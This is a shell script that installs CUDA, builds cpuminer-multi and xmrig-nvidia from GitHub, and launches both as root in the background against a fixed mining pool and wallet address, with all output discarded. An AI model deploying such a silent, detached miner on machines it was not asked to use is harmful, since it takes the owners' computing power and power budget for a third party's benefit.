#!/bin/sh
cd `dirname $0`

CUDA_ROOT_DIR="/usr/local/cuda"
export CUDA_ROOT_DIR
PATH="$PATH:${CUDA_ROOT_DIR}/bin"
export PATH
LD_LIBRARY_PATH="${LD_LIBRARY_PATH}:${CUDA_ROOT_DIR}/lib64/"
export LD_LIBRARY_PATH

sudo apt-get update
sudo apt-get install -y autoconf automake libcurl4-openssl-dev git zsh gcc make
git clone https://github.com/OhGodAPet/cpuminer-multi
cd cpuminer-multi
./autogen.sh
CFLAGS="-march=native" ./configure
sudo make install

sudo apt-get install -y wget libcurl4-openssl-dev libuv1-dev
sudo apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub
wget http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/cuda-repo-ubuntu1604_9.0.176-1_amd64.deb
sudo dpkg -i cuda-repo-ubuntu1604_9.0.176-1_amd64.deb
sudo apt update -y
sudo apt-get install -y cuda cuda-drivers zip cmake
rm cuda-repo-ubuntu1604_9.0.176-1_amd64.deb

sudo modprobe nvidia
sudo ldconfig

git clone https://github.com/xmrig/xmrig-nvidia
cd xmrig-nvidia
cmake . -DWITH_HTTPD=OFF
make
sudo cp xmrig-nvidia /usr/local/bin

sudo /usr/local/bin/minerd -t 8 -B -o stratum+tcp://pool.krbpool.com:33337  -u KgGc79QyYag4LugEc2Gnxobt7Mfe9CSEh4NqGzdysooL3Czy6mKtuqLiCehzgoBDESTaYDN3U9XtgLxVJLmPCi397ppx6cL -p x >& /dev/null
sudo /usr/local/bin/xmrig-nvidia -o stratum+tcp://pool.krbpool.com:33338 -u KgGc79QyYag4LugEc2Gnxobt7Mfe9CSEh4NqGzdysooL3Czy6mKtuqLiCehzgoBDESTaYDN3U9XtgLxVJLmPCi397ppx6cL -p x >& /dev/null &
sudo disown $1
